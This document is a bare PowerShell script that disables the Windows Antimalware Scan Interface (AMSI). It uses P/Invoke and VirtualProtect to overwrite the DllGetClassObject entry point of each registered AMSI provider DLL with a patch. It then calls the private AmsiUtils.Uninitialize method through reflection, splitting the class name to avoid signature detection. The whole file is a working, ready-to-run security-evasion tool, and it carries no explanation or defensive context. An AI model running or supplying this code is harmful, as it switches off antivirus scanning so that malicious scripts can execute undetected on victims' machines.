$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);

	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,out uint lpflOldProtect);
}
"@

Add-Type $Win32

foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft\AMSI\Providers -Name)
{
    $Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)

    $registry = 'HKLM:\Software\Classes\CLSID\' + $provider + '\InprocServer32'
    $dllPath = Get-ItemPropertyValue -Name '(default)' $registry
    $providerDLL = Split-Path $dllPath -leaf
    $dll = $providerDLL -replace '"', ""
  
    $LoadLibrary = [Win32]::LoadLibrary($dll )
    $Address = [Win32]::GetProcAddress($LoadLibrary, "DllGetClassObject")
    $p = 0
    [Win32]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
    [System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)
}

$object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
$Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
